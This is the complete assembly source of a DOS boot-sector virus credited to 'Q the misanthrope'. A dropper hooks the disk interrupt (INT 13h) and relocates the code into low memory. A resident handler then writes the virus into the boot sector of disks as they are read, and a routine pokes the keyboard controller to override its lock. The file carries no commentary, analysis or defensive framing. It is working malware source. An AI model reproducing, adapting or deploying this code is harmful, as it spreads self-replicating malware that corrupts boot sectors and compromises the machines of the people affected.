

cseg            segment para    public  'code'
q_squared       proc    near
assume          cs:cseg


;designed by "Q" the misanthrope.


.186

WRITE_COMMAND   equ     060h
COMMAND_8042    equ     064h
STATUS_8042     equ     064h
PORT_HAS_DATA   equ     002h
OVERRIDE_LOCK   equ     04bh
DATA_REGISTER   equ     060h
ADDR_MUL        equ     004h
BIOS_INT_13     equ     0c6h
BOOT_INT        equ     019h
BOOT_OFFSET     equ     07c00h
COM_OFFSET      equ     00100h
DISK_INT        equ     013h
DOS_INT         equ     021h
DOS_SET_INT     equ     02500h
FIRST_SECTOR    equ     00001h
INITIAL_BX      equ     00078h
LOW_CODE        equ     0021dh
NEW_INT_13_LOOP equ     0cdh
READ_A_SECTOR   equ     00201h
RETURN_NEAR     equ     0c3h
SECTOR_SIZE     equ     00200h
TERMINATE_W_ERR equ     04c00h
TWO_BYTES       equ     002h
VIRGIN_INT_13_B equ     007b4h
WRITE_A_SECTOR  equ     00301h


io_seg          segment at 00070h
		org     00000h
io_sys_loads_at label   word
io_seg          ends


bios_seg        segment at 0f000h
		org     09315h
original_int_13 label   word
bios_seg        ends


		org     COM_OFFSET
com_code:


dropper         proc    near
		mov     ax,DOS_SET_INT+BIOS_INT_13
		cwd
		mov     ds,dx
		lds     dx,dword ptr ds:[VIRGIN_INT_13_B]
		int     DOS_INT
		cwd
		push    dx
		pop     ds
		mov     dx,offset interrupt_13+LOW_CODE-offset old_jz
		mov     ax,DOS_SET_INT+DISK_INT
		int     DOS_INT
		mov     di,LOW_CODE
		mov     si,offset old_jz
		mov     ax,offset return_here
		push    ds
		pop     es
		push    ax
		jmp     move_to_boot
return_here:    push    cs
		mov     cx,FIRST_SECTOR
		mov     ax,READ_A_SECTOR
		mov     bx,offset buffer
		mov     dx,00180h
		pop     es
		int     DISK_INT
already_set:    mov     ax,TERMINATE_W_ERR
		int     DOS_INT
dropper         endp



		org     0048h+COM_OFFSET
		call    initialize


		org     00ebh+COM_OFFSET
old_jz:         jz      old_code


		org     00edh+COM_OFFSET


error:          jmp     restart_it+LOW_CODE-000ebh-BOOT_OFFSET
move_to_low:    sub     ax,ax
		mov     si,offset old_jz+BOOT_OFFSET-COM_OFFSET
move_to_boot:   pushf
		mov     cx,offset jmp_old_int_13-offset old_jz+1
		cld
		rep     movs byte ptr es:[di],cs:[si]
		popf
		ret


old_code:       mov     ax,word ptr ds:[bx+01ah]
		dec     ax
		mov     di,BOOT_OFFSET+049h
		sub     bx,bx
		dec     ax
		mov     bl,byte ptr ds:[di-03ch]
		mul     bx
		add     ax,word ptr ds:[di]
		mov     bx,00700h
		mov     cl,003h
		adc     dx,word ptr ds:[di+002h]
old_loop:       pusha
		call    more_old_code
		popa
		jc      error
		add     bx,word ptr ds:[di-03eh]
		add     ax,0001h
		adc     dx,00h
		loop    old_loop
		xchg    dl,byte ptr ds:[di-025h]
		xchg    ax,word ptr ds:[di+002h]
		xchg    ch,byte ptr ds:[di-034h]
		xchg    bx,word ptr ds:[di]
		jmp     far ptr io_sys_loads_at


initialize:     mov     di,LOW_CODE
		push    ss
		mov     bx,INITIAL_BX
		pop     ds
recompare:      cmp     word ptr ds:[di],ax
		jne     move_to_low
		xchg    word ptr ds:[bx+(DISK_INT*ADDR_MUL+TWO_BYTES)-INITIAL_BX],ax
set_interrupts: mov     word ptr ds:[BIOS_INT_13*ADDR_MUL+TWO_BYTES],ax
		mov     cx,offset interrupt_13+LOW_CODE-offset old_jz
		xchg    word ptr ds:[bx+(DISK_INT*ADDR_MUL)-INITIAL_BX],cx
		mov     word ptr ds:[BIOS_INT_13*ADDR_MUL],cx
is_resident:    jmp     short disable_lock


load_from_disk: xchg    ax,cx
		xchg    ch,cl
		xchg    dh,dl
		int     DISK_INT
		ret


		org     0160h+COM_OFFSET


more_old_code:  mov     si,BOOT_OFFSET+018h
		cmp     dx,word ptr ds:[si]
		jnb     stc_return
		div     word ptr ds:[si]
		inc     dx
		mov     ch,dl
		cwd
		div     word ptr ds:[si+002h]
		mov     dh,byte ptr ds:[si+00ch]
		shl     ah,006h
		or      ah,ch
		mov     cx,READ_A_SECTOR
		jmp     short load_from_disk


		db      "ûQý"


		org     0180h+COM_OFFSET

stc_return:     stc
		ret


disable_lock:   mov     al,WRITE_COMMAND
		out     COMMAND_8042,al
get_status:     in      al,STATUS_8042
		test    al,PORT_HAS_DATA
		loopnz  get_status
		mov     al,OVERRIDE_LOCK
		out     DATA_REGISTER,al
		jmp     short recompare

		
restart_it:     int     BOOT_INT


		org     0194h+COM_OFFSET


interrupt_13    proc    far
		cmp     cx,FIRST_SECTOR
		jne     jmp_old_int_13
		cmp     ah,high(READ_A_SECTOR)
		jne     jmp_old_int_13
		cmp     dh,cl
		ja      jmp_old_int_13
		pusha
		int     BIOS_INT_13
		jc      not_boot_sect
		lea     di,ds:[bx+offset old_jz-COM_OFFSET]
		mov     byte ptr es:[di+00ch],RETURN_NEAR
		cmp     bh,high(BOOT_OFFSET)
		jne     seeifusaboot
		cmp     dl,cl
		ja      seeifusaboot
		popa
		stc
		retf    2
seeifusaboot:   mov     ax,0efe8h
		xchg    word ptr es:[bx+048h],ax
		xor     ax,078bbh
		jnz     not_boot_sect
		cmp     bh,high(BOOT_OFFSET)
		pushf
		pusha
		jne     no_key_press
		call    near ptr hit_any_key
no_key_press:   popa
		mov     si,LOW_CODE
		mov     ax,WRITE_A_SECTOR
		call    move_to_boot
		inc     cx
		int     BIOS_INT_13
		popf
		je      restart_it
not_boot_sect:  popa
interrupt_13    endp


		org     01e5h+COM_OFFSET
jmp_old_int_13: jmp     far ptr original_int_13


buffer          db      0


		org     7cedh-LOW_CODE+offset old_jz
hit_any_key     label   word


q_squared       endp
cseg            ends
end             com_code


